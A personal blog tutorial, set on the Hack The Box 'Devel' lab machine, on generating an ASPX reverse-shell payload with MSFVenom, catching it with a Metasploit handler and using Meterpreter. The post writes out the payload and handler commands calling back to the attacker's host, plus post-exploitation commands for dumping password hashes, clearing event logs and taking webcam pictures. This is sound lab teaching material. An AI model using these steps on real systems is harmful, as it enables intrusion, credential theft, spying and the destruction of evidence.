<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.11.2 by Michael Rose
  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>MSFVenom and Meterpreter: The basics · L1Cafe</title>
<meta name="description" content="I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the Devel machine in Hack The Box.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="L1Cafe">
<meta property="og:title" content="MSFVenom and Meterpreter: The basics">
<meta property="og:url" content="http://localhost:4000/2018/09/11/msfvenom">


  <meta property="og:description" content="I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the Devel machine in Hack The Box.">



  <meta property="og:image" content="http://localhost:4000/assets/images/2018-09-11-msfvenom/header.jpg">



  <meta name="twitter:site" content="@L1Cafe">
  <meta name="twitter:title" content="MSFVenom and Meterpreter: The basics">
  <meta name="twitter:description" content="I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the Devel machine in Hack The Box.">
  <meta name="twitter:url" content="http://localhost:4000/2018/09/11/msfvenom">

  
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="http://localhost:4000/assets/images/2018-09-11-msfvenom/header.jpg">
  

  



  <meta property="article:published_time" content="2018-09-11T13:20:20+02:00">






<link rel="canonical" href="http://localhost:4000/2018/09/11/msfvenom">





  <script type="application/ld+json">
    {
      "@context": "http://schema.org",
      "@type": "Organization",
      "url": "http://localhost:4000",
      "logo": "http://localhost:4000/assets/images/logo-bordered.png"
    }
  </script>



  <script type="application/ld+json">
    {
      "@context": "http://schema.org",
      "@type": "Person",
      "name": "León Castillejos",
      "url": "http://localhost:4000",
      "sameAs": ["https://twitter.com/L1Cafe","https://www.linkedin.com/in/l1cafe","https://github.com/L1Cafe","https://gitlab.com/L1Cafe","https://soundcloud.com/l1cafe","https://keybase.io/l1cafe"]
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="L1Cafe Feed">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if lte IE 9]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->


    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    <div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        <a class="site-title" href="/">L1Cafe</a>
        <ul class="visible-links">
          
            
            <li class="masthead__menu-item">
              <a href="http://localhost:4000/about/" >About me</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="http://localhost:4000/projects/" >My projects</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="http://localhost:4000/bookmarks/" >Bookmarks</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="http://localhost:4000/tags/" >Tags</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="http://localhost:4000/categories/" >Categories</a>
            </li>
          
            
            <li class="masthead__menu-item">
              <a href="http://localhost:4000/year-archive/" >Posts</a>
            </li>
          
        </ul>
        
        <button class="search__toggle" type="button">
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle Menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>

    <div class="initial-content">
      
  











<div class="page__hero"
  style=" "
>
  
    <img src="/assets/images/2018-09-11-msfvenom/header.jpg" alt="MSFVenom and Meterpreter: The basics" class="page__hero-image">
  
  
    <span class="page__hero-caption">Photo credit: <a href="https://unsplash.com"><strong>Unsplash</strong></a>
</span>
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="http://schema.org/Person">

  
    <div class="author__avatar">
      

      
        
        <a href="https://L1Cafe.blog">
          <img src="/assets/images/avatar.jpg" alt="León Castillejos" itemprop="image">
        </a>
      
    </div>
  

  <div class="author__content">
    
      <a href="https://L1Cafe.blog"><h3 class="author__name" itemprop="name">León Castillejos</h3></a>
    
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Details</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">European Union</span>
        </li>
      

      

      
        <li>
          <a href="mailto:L1Cafe-github@tuta.io">
            <meta itemprop="email" content="L1Cafe-github@tuta.io" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      
        <li>
          <a href="https://keybase.io/l1cafe" itemprop="sameAs">
            <i class="fas fa-fw fa-key" aria-hidden="true"></i> Keybase
          </a>
        </li>
      

      
        <li>
          <a href="https://twitter.com/L1Cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/l1cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/L1Cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      
        <li>
          <a href="https://gitlab.com/L1Cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-gitlab" aria-hidden="true"></i> GitLab
          </a>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://soundcloud.com/l1cafe" itemprop="sameAs">
            <i class="fab fa-fw fa-soundcloud" aria-hidden="true"></i> SoundCloud
          </a>
        </li>
      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
    <meta itemprop="headline" content="MSFVenom and Meterpreter: The basics">
    <meta itemprop="description" content="I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the Devel machine in Hack The Box.">
    <meta itemprop="datePublished" content="September 11, 2018">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">MSFVenom and Meterpreter: The basics
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  3 minute read
</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p>I just recently successfully gained root (or rather, Administrator, because it’s a Windows box) on the <strong>Devel</strong> machine in <a href="https://hackthebox.eu">Hack The Box</a>.</p>

<p>The machine itself is very easy, and there are lots of writeups on it, I’m sure, so this won’t be another one. However, one thing it made really clear and simple was learning <strong>MSFVenom</strong> and getting to use reverse shells in a realistic scenario. Therefore, I’ll use the machine as an example to illustrate the usage of MSFVenom.</p>

<p>In this case, the machine is running IIS, with an FTP server that allows anonymous uploads, and an HTTP server running on the traditional port 80.</p>

<p>This is where MSFVenom comes in handy: We can upload arbitrary files and trigger their execution.</p>

<p>Some information:</p>
<ul>
  <li>The victim’s IP is <code class="highlighter-rouge">10.10.10.5</code></li>
  <li>Our IP is <code class="highlighter-rouge">x.y.z.w</code></li>
  <li>We have no firewalls blocking inbound connections (this is a requirement if you want to have reverse shells connect back to you)</li>
</ul>

<h2 id="the-reverse-shell">The reverse shell</h2>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.y.z.w LPORT=1337 -f aspx &gt; devel.aspx
</code></pre></div></div>

<p>This:</p>
<ul>
  <li>Sets the payload to be a reverse TCP meterpreter shell (for Metasploit), for Windows machines. You can query the full list of payloads by running <code class="highlighter-rouge">$ msfvenom -l payloads</code></li>
  <li>Sets our IP to be <code class="highlighter-rouge">x.y.z.w</code> (the victim machine must be able to reach us on that IP)</li>
  <li>Sets our listening port to be <code class="highlighter-rouge">1337</code> (remember this, you’ll need it to configure the listening end of the reverse shell: Metasploit)</li>
  <li>Sets the format to be ASPX, C#</li>
  <li>Creates a file called <code class="highlighter-rouge">devel.aspx</code> in the current directory</li>
</ul>

<h2 id="configure-metasploit">Configure Metasploit</h2>

<p>Now we have to configure Metasploit to listen to remote connections, using the same parametres given to MSFVenom.</p>

<p>(The following commands are to be executed sequentially in a Metasploit Console)</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost x.y.z.w
set lport 1337
set ExitOnSession false
exploit -j
</code></pre></div></div>

<p>Metasploit is now ready to accept connections to port <code class="highlighter-rouge">1337</code> and the specified IP address (in this case <code class="highlighter-rouge">x.y.z.w</code>)</p>

<h2 id="triggering-the-reverse-shell">Triggering the reverse shell</h2>

<p>In this case, now that we have the <code class="highlighter-rouge">devel.aspx</code> file, we have to upload it via FTP. Because the FTP is pointing to the same directory as the HTTP server, we can just drop it there, and then navigate to <code class="highlighter-rouge">http://10.10.10.5/devel.aspx</code>. A blank page will appear, but if we did everything correctly, a new line will appear in the listening console. It will say something similar to: <code class="highlighter-rouge">Meterpreter session 1 opened (x.y.z.w:1337 -&gt; 10.10.10.5:49160)</code>.</p>

<p>At this point, we can list sessions by issuing <code class="highlighter-rouge">sessions -l</code> at the Metasploit console, and attach to the newly opened session by running <code class="highlighter-rouge">sessions &lt;SESSION ID&gt;</code>, in this case, the session ID is 1, so <code class="highlighter-rouge">sessions 1</code> attaches correctly to the shell.</p>

<h2 id="meterpreter">Meterpreter</h2>

<p>Now we’re in a Meterpreter Windows session, we can issue the following commands (note that to specify the folder separator in Meterpreter, you must use double slashes <code class="highlighter-rouge">//</code> and not the standard Windows backslash <code class="highlighter-rouge">\</code>):</p>
<ul>
  <li><code class="highlighter-rouge">ls</code> or <code class="highlighter-rouge">dir</code>: lists the files and directories</li>
  <li><code class="highlighter-rouge">cd</code>: changes directory, behaves just like Linux systems</li>
  <li><code class="highlighter-rouge">pwd</code>: shows the full path for the current directory, similar to Linux as well</li>
  <li><code class="highlighter-rouge">background</code>: sends the Meterpreter session to the background, and resumes your Metasploit session, you can always return by reattaching the session with <code class="highlighter-rouge">sessions &lt;SESSION ID&gt;</code></li>
  <li><code class="highlighter-rouge">cat</code>: prints text files to the screen, like the Linux command of the same name</li>
  <li><code class="highlighter-rouge">download</code> or <code class="highlighter-rouge">upload</code>: respectively download or upload files from/to the machine</li>
  <li><code class="highlighter-rouge">getuid</code>: returns the user the reverse shell is running with, useful to let us know if we gained Administrator access</li>
  <li><code class="highlighter-rouge">clearev</code>: clears the <em>Application</em>, <em>System</em> and <em>Security</em> logs for the machine</li>
  <li><code class="highlighter-rouge">execute</code>: runs an arbitrary command given as the argument</li>
  <li><code class="highlighter-rouge">hashdump</code>: dumps the contents of the <em>SAM</em> database</li>
  <li><code class="highlighter-rouge">idletime</code>: displays how much time has passed since the user was active</li>
  <li><code class="highlighter-rouge">ipconfig</code>: retrieves the network interface configuration</li>
  <li><code class="highlighter-rouge">ps</code>: like the Linux tool of the same name, displays a list of running processes in the victim machine</li>
  <li><code class="highlighter-rouge">shell</code>: invokes a standard shell</li>
  <li><code class="highlighter-rouge">webcam_list</code>: displays currently connected and configured web cams on the victim machine</li>
  <li><code class="highlighter-rouge">webcam_snap</code>: takes a picture from a connected camera, and saves it to the current working directory with a random filename</li>
</ul>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#cybersecurity" class="page__taxonomy-item" rel="tag">Cybersecurity</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-09-11T13:20:20+02:00">September 11, 2018</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/2018/08/30/proxmox-vnc" class="pagination--pager" title="Proxmox tip: “Failed to start VNC server: Failed to bind socket: Cannot assign requested address”
">Previous</a>
    
    
      <a href="/2018/10/12/apple-t2-security" class="pagination--pager" title="What Apple’s T2 chip means for the security of Macs
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You May Also Enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-10-12-apple-t2-security/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/10/12/apple-t2-security" rel="permalink">What Apple’s T2 chip means for the security of Macs
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  4 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">An article by Mac Rumors was recently published, revealing Apple had designed a component, which, according to an Apple document, would “result in an inopera...</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-08-30-proxmox-vnc/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/08/30/proxmox-vnc" rel="permalink">Proxmox tip: “Failed to start VNC server: Failed to bind socket: Cannot assign requested address”
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  2 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">Note: This issue appears on Proxmox 5.2-x, always check the date of the post when troubleshooting your systems.

</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-06-14-defeat-spammers/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/06/14/defeat-spammers" rel="permalink">The DEFINITIVE guide to defeating spammers
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  6 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">Nowadays, spamming is a very common technique, and nobody can deny that. Spamming is so cheap that even a 10% opening rate is a tremendous success, because s...</p>
  </article>
</div>
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src=
          
            "/assets/images/2018-06-10-fun-begins/header.jpg"
          
          alt="">
      </div>
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/2018/06/10/fun-begins" rel="permalink">The fun begins: HackTheBox.eu
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  1 minute read
</p>
    
    <p class="archive__item-excerpt" itemprop="description">It’s been a while since I joined https://www.hackthebox.eu/. Probably more than a year. And I haven’t really had the time to spend trying to break into the m...</p>
  </article>
</div>
        
      </div>
    </div>
  
  
</div>
    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
    <div id="results" class="results"></div></div>
      </div>
    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    
    
      <li><a href="https://twitter.com/L1Cafe"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
    
    
    
      <li><a href="https://github.com/L1Cafe"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
    
    
      <li><a href="https://gitlab.com/L1Cafe"><i class="fab fa-fw fa-gitlab" aria-hidden="true"></i> Gitlab</a></li>
    
    
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2018 L1Cafe.

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.0.13/js/all.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    (function ($) {
    var $comments = $('.js-comments');

    $('#new_comment').submit(function () {
      var form = this;

      $(form).addClass('disabled');
      $('#comment-form-submit').html('<i class="fas fa-spinner fa-spin fa-fw"></i> Loading...');

      $.ajax({
        type: $(this).attr('method'),
        url: $(this).attr('action'),
        data: $(this).serialize(),
        contentType: 'application/x-www-form-urlencoded',
        success: function (data) {
          $('#comment-form-submit').html('Submitted');
          $('.page__comments-form .js-notice').removeClass('notice--danger');
          $('.page__comments-form .js-notice').addClass('notice--success');
          showAlert('Thanks for your comment! It will show on the site once it has been approved.');
        },
        error: function (err) {
          console.log(err);
          $('#comment-form-submit').html('Submit Comment');
          $('.page__comments-form .js-notice').removeClass('notice--success');
          $('.page__comments-form .js-notice').addClass('notice--danger');
          showAlert('Sorry, there was an error with your submission. Please make sure all required fields have been completed and try again.');
          $(form).removeClass('disabled');
        }
      });

      return false;
    });

    function showAlert(message) {
      $('.page__comments-form .js-notice').removeClass('hidden');
      $('.page__comments-form .js-notice-text').html(message);
    }
  })(jQuery);
  </script>

  



  </body>
</html>